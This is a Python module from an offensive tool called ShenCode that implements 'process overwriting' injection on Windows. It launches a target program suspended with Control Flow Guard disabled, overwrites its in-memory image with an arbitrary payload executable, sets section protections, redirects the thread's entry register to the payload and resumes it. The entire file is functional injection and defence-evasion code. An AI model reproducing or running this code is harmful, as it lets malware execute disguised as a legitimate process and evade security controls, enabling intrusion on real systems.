########################################################
### ShenCode Module
###
### Name: PS-Overwrite
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

import ctypes
from utils.style import *
from utils.windef import *
from utils.winconst import *

CATEGORY    = 'inject'
DESCRIPTION = 'Process_Overwrite Module, depends on https://github.com/hasherezade/process_overwriting'

cs = ConsoleStyles()

arglist = {
    'target':           { 'value': '', 'desc': 'Target process, to overwrite' },
    'payload':          { 'value': '', 'desc': 'Payload, which overwrites the target' },
}

def register_arguments(parser):
            parser.add_argument('-p', '--payload', type=str, required=True, help=arglist['payload']['desc'])
            parser.add_argument('-t', '--target', type=str, required=True, help=arglist['target']['desc'])

class module:
        Author = 'psycore8'
        Version = '0.9.0'
        DisplayName = 'PROCESS-OVERWRITE'
        pid = 0
        attr_list = any
        shell_path = '::inject::psoverwrite'
        import pefile
        import os   

        def __init__(self, target, payload):
              self.target = target
              self.payload = payload
                       
        def get_remote_base_address(self, hp):

            pbi = PROCESS_BASIC_INFORMATION()
            status = ntdll.NtQueryInformationProcess(hp, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), None)
            
            if status != 0:
                print(f"NtQueryInformationProcess error: {ctypes.get_last_error()}")
                kernel32.CloseHandle(hp)
                return None

            peb_address = LPCVOID(pbi.PebBaseAddress)
            peb = PEB()
            if not kernel32.ReadProcessMemory(hp, peb_address, ctypes.byref(peb), ctypes.sizeof(peb), None):
                print(f"ReadProcessMemory error: {ctypes.get_last_error()}")
                kernel32.CloseHandle(hp)
                return None
            return peb.ImageBaseAddress

        def translate_protect(self, sec_charact):
            memory_access = {
                 'E': PAGE_EXECUTE_READWRITE,
                 '6': PAGE_EXECUTE_READ,
                 '2': PAGE_EXECUTE_READ,
                 'C': PAGE_READWRITE,
                 '4': PAGE_READONLY
            }
            B = hex(sec_charact)[2:3]
            try:
                 result = memory_access[B]
                 return result
            except KeyError:
                 return PAGE_READWRITE
        
        def set_section_access(self, hProcess, base_address, pe_implant, image_size_target):
            op = USHORT(0)
            status = VirtualProtectEx(hProcess, base_address, PAGE_SIZE, PAGE_READONLY, op)
            for section in pe_implant.sections:
                sec_protect = self.translate_protect( section.Characteristics )
                sec_offset_va = section.VirtualAddress
                next_sec_va = base_address + sec_offset_va
                protect_size = image_size_target - sec_offset_va
                status = VirtualProtectEx(hProcess, next_sec_va, protect_size, sec_protect, op)
                if status != 0:
                     pass
                else:
                    cs.console_print.error(f'VirtualProtectEx error: {ctypes.get_last_error()}')
                    return
        
        def free_nocfg_attributes(siex):
            if siex.lpAttributeList:
                kernel32.DeleteProcThreadAttributeList(siex.lpAttributeList)
                kernel32.HeapFree(kernel32.GetProcessHeap(), 0, siex.lpAttributeList)
                siex.lpAttributeList = None
                     
        def process(self):
            pe = {
                 'payload'  : { 'image_size': 0, 'image_base': 0 },
                 'target'   : { 'image_size': 0, 'image_base': 0 }
            }

            cs.module_header(self.DisplayName, self.Version)
            bytes_written = SIZE_T()
            context = CONTEXT()
            oldprotect = USHORT(0)
            pi = PROCESS_INFORMATION()

            target_exists = self.os.path.exists(self.target)
            payload_exists = self.os.path.exists(self.payload)
            if not target_exists:
                 cs.console_print.error(f'Given argument is not valid: {self.target}')
            if not payload_exists:
                 cs.console_print.error(f'Given argument is not valid: {self.target}')

            process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE
            cs.console_print.note('CFGuard mitigation will be applied!')
            process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
            size = ctypes.c_size_t()
            kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
            attr_list = ctypes.create_string_buffer(size.value)
            if not kernel32.InitializeProcThreadAttributeList(attr_list, 1, 0, ctypes.byref(size)):
                raise ctypes.WinError(ctypes.get_last_error())
            policy = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
            if not kernel32.UpdateProcThreadAttribute(attr_list, 0,  PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(policy), ctypes.sizeof(policy), None, None):
                raise ctypes.WinError(ctypes.get_last_error())
            siex = STARTUPINFOEX()
            siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
            siex.lpAttributeList = ctypes.cast(attr_list, ctypes.c_void_p)

            cs.console_print.note('Create suspended Process...')
            success = CreateProcess(None, ctypes.c_wchar_p(self.target), None, None, False, process_flags, None, None, ctypes.byref(siex), ctypes.byref(pi))
            if not success:
                cs.console_print.error(f'Error: {ctypes.get_last_error()}')
                cs.console_print.error('CreateProcess failed')
                return

            cs.console_print.ok(f'CreateProcess successful! PID: {pi.dwProcessId}')
            kernel32.DeleteProcThreadAttributeList(attr_list)

            base_address = self.get_remote_base_address(pi.hProcess)
            if base_address:
                 cs.console_print.note(f'Base address found: {hex(base_address)}')
            else:
                cs.console_print.error('Base address NOT found')

            cs.console_print.note('Processing target image')

            pe_target = self.pefile.PE(self.target)
            pe['target']['image_size'] = pe_target.OPTIONAL_HEADER.SizeOfImage
            pe['target']['image_base'] = pe_target.OPTIONAL_HEADER.ImageBase
            target_info = f'image base: {hex(pe["target"]["image_base"])} - Size: {pe["target"]["image_size"]}'
            cs.console_print.note(f'Target: {target_info}')
            cs.console_print.note('Processing payload image')
            pe_payl = self.pefile.PE(self.payload)
            pe['payload']['image_base'] = pe_payl.OPTIONAL_HEADER.ImageBase
            pe['payload']['image_size'] = pe_payl.OPTIONAL_HEADER.SizeOfImage

            payload_info = f'image base: {hex(pe["payload"]["image_base"])} - Size: {pe["payload"]["image_size"]}'
            cs.console_print.ok(f'Payload: {payload_info}')

            if pe['payload']['image_size'] > pe['target']['image_size']:
                 cs.console_print.error('The payload is too big to fit in target!')

            cs.console_print.note('Mapping memory image')
            pe_module = pe_payl.get_memory_mapped_image()

            ### fill payload PE image with 00
            padding_bytes = pe['target']['image_size'] - len(pe_module)
            cs.console_print.note(f'Padding image to target size, adding {padding_bytes} bytes')
            padding = (pe['target']['image_size'] - len(pe_module)) * b'\x00'
            padded_payl = pe_module + padding

            status = VirtualProtectEx(pi.hProcess, base_address, pe['target']['image_size'], PAGE_READWRITE, oldprotect)

            cs.console_print.note('Writing to process memory')
            if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, pe['target']['image_size'], ctypes.byref(bytes_written)):
                 raise Exception(f"WriteProcessMemory error: {ctypes.get_last_error()}")

            cs.console_print.ok(f'{bytes_written.value} bytes written to target process')
            self.set_section_access(pi.hProcess, base_address, pe_payl, pe['target']['image_size'])
            entry_point_rva = pe_payl.OPTIONAL_HEADER.AddressOfEntryPoint
            entry_point = base_address + entry_point_rva
            cs.console_print.note(f'Entry point is {hex(entry_point)}')
            cs.console_print.note('Redirecting code flow to new entry point')
            context.ContextFlags = 0x10007  # CONTEXT_FULL
            status = GetThreadContext(pi.hThread, ctypes.byref(context))
            if status == 0:
                 raise Exception(f"GetThreadCntext error: {ctypes.get_last_error()}")

            context.Rcx = entry_point
            status = SetThreadContext(pi.hThread, ctypes.byref(context))
            if status == 0:
                 raise Exception(f"SetThreadCntext error: {ctypes.get_last_error()}")
            else:
                 cs.console_print.ok(f'RCX value changed to {hex(entry_point)}')

            cs.console_print.ok(f'ResumeThread PID: {pi.dwProcessId}')
            ResumeThread(pi.hThread)

            CloseHandle(pi.hThread)
            CloseHandle(pi.hProcess)
            cs.console_print.ok('DONE!')
